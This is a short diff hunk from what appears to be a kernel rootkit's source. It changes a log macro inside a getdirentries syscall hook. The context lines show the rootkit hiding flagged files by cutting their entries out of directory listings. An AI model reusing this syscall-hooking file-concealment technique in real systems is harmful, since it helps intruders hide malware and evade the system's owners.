@@ -269,7 +269,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 
 			if (is_hidden_file_in_dir(td, uap->fd, current->d_name))
 			{
-				LOGI("[rootkit:getdirentries_hook] Hidden file request.\n");
+				LOGF("[rootkit:getdirentries_hook] Hidden file request.\n");
 				if (count != 0)
 				{
 					bcopy(current + current->d_reclen,
